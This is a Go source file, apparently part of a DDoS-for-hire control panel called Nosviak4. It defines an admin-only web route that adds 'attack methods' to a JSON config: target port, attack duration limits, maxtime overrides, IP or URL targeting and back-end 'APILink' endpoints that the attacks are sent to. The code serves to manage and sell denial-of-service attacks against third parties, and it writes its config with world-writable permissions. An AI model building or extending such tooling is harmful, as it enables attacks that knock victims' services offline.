package routes

import (
	"Nosviak4/source"
	"Nosviak4/source/functions"
	"Nosviak4/source/database"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"html/template"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// AttacksAPIPage is a static file which is open for the conns to use and customize but not add too.
var AttacksAPIPage = template.Must(template.ParseFiles(filepath.Join("assets", "schemas", "web", "apis.html")))

// AttacksAPI is the page where users can add additional methods to their config
func AttacksAPI(writer http.ResponseWriter, request *http.Request) {
	token, err := functions.ExtractToken(request)
	if err != nil || token == nil {
		http.Redirect(writer, request, "/login", http.StatusFound)
		return
	}

	user, err := token.GetUser()
	if err != nil || user == nil || !database.DB.IsSuperuser(user) {
		http.Redirect(writer, request, "/login", http.StatusFound)
		return
	}

	data := make(map[string]any)
	data["session"] = hex.EncodeToString(sha256.New().Sum(token.Signature))
	data["methods"] = source.Methods
	data["groups"] = source.MethodConfig.Attacks.Groups
	data["error"] = ""

	switch request.Method {

	case http.MethodPost:
		if err := request.ParseForm(); err != nil {
			data["error"] = "internal server error occurred"
			break
		}

		defaultPort, err := strconv.Atoi(request.Form.Get("DefaultPort"))
		if err != nil {
			data["error"] = "invalid default port"
			break
		}

		defaultDuration, err := strconv.Atoi(request.Form.Get("DefaultDuration"))
		if err != nil {
			data["error"] = "invalid default duration"
			break
		}

		clone := make(map[string]any)
		for name, method := range source.Methods {
			clone[name] = method
		}

		if _, ok := clone[request.Form.Get("MethodName")]; ok && request.Form.Get("FormName") == "create" {
			data["error"] = "duplicate method name"
			break
		}

		minimumDuration, err := strconv.Atoi(request.Form.Get("MinimumDuration"))
		if err != nil {
			data["error"] = "invalid minimum duration"
			break
		}

		MaxtimeOverride, err := strconv.Atoi(request.Form.Get("MaxtimeOverride"))
		if err != nil {
			data["error"] = "invalid maxtime override duration"
			break
		}

		EnhancedMaxtime, err := strconv.Atoi(request.Form.Get("EnhancedMaxtime"))
		if err != nil {
			data["error"] = "invalid enhanced duration"
			break
		}

		// builds the method portfolio
		method := &source.Method{
			Description:     request.Form.Get("MethodDescription"),
			Access:          strings.Split(request.Form.Get("Roles"), ","),
			IPAllowed:       request.Form.Get("IPAllowed") == "on",
			URLAllowed:      request.Form.Get("URLAllowed") == "on",
			DefaultPort:     defaultPort,
			DefaultDuration: defaultDuration,
			Options: source.MethodOptions{
				EnhancedMaxtime: EnhancedMaxtime,
				MaxtimeOverride: MaxtimeOverride,
				MinimumDuration: minimumDuration,
				MethodGroup:     request.Form.Get("groupDropdown"),
				API:             false, Bot: false,
			},

			// by default we enforce URL encoding
			URLEncoding: true,
		}

		if len(request.Form.Get("APILink")) > 0 {
			method.URLs = strings.Split(request.Form.Get("APILink"), ",")
		}

		clone[request.Form.Get("MethodName")] = method
		content, err := json.MarshalIndent(clone, "", "\t")
		if err != nil || len(content) == 0 {
			data["error"] = "error building payload"
			break
		}

		if err := os.WriteFile(filepath.Join(source.ASSETS, "attacks", "apis.json"), content, 0777); err != nil {
			data["error"] = "error writing payload"
			break
		}

		data["methods"] = clone
	}

	AttacksAPIPage.Execute(writer, data)
}
